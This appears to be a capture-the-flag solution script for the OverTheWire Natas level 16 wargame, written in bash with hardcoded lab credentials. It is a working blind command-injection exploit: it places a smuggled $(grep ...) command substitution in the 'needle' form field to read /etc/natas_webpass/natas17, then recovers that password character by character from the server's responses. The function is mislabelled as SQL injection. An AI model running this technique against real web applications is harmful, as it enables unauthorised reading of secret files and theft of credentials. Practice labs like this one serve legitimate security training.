
declare -a password=()
blind_sql(){
	p=$password$1
	val=$(curl -isu natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh http://natas16.natas.labs.overthewire.org/ -F needle="\$(grep ^$p /etc/natas_webpass/natas17)doctor")
	if [[ ! "$val" =~ doctor ]]; then
		echo "--------------------"
		echo "[+] currect part $p"
		echo "--------------------"
		password+=$1
	else
		echo "[-] failed: $p"
	fi
}

while [ ${#password} -lt 32 ];
do
	for n in {a..z} {A..Z} {0..9}
	do
		blind_sql "$n"
	done
done

echo "$password"
